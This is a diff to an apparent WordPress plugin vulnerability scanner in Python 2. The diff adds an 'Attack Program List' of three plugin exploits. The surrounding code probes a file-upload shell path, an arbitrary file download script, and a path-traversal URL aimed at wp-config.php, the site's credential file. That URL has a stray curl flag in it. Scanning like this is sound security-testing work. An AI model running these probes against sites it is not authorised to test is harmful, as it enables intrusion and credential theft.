@@ -5,9 +5,14 @@ class PluginCheck():
 	def __init__(self,tempurl):
 		self.url = "http://{0}".format(tempurl)
 		self.count = 0
+		self.explist = []
+		self.explist.append('Wordpress Plugins jQuery Html5 File Upload')
+		self.explist.append('Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download')
+		self.explist.append('WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure')
 
 	def scan(self):
 		#Wordpress Plugins jQuery Html5 File Upload
+		
 		self.path1 =   self.url+'/wp-admin/admin-ajax.php?action=load_ajax_function'
 		self.path2 =  self.url+'/wp-content/plugins/jquery-html5-file-upload/'
 		self.re1= requests.get(self.path2)
@@ -19,6 +24,7 @@ class PluginCheck():
  				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
  				self.count+=1
  		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
+		 
  		self.path3 = self.url+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
  		self.re3 = requests.get(self.path3)
  		if(self.re3.status_code ==  200):
@@ -27,6 +33,7 @@ class PluginCheck():
  			self.count+=1
 
  		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
+		
  		self.path5 =  self.url+'/wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
  		self.path6 = self.url+'?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'
  		self.re4 = requests.get(self.path5)
@@ -39,3 +46,13 @@ class PluginCheck():
  				self.count+=1
  		if(self.count == 0):
  			print "\33[32mNo Vulnerability Found\33[0m"
+
+	def show(self):
+		number = 0
+		print 'Attack Program List'
+		for exp in self.explist:
+			number = number+ 1
+			print "\33[31m"'[+] '+str(number)+': '+exp+"\033[0m"
+		
+		
+		
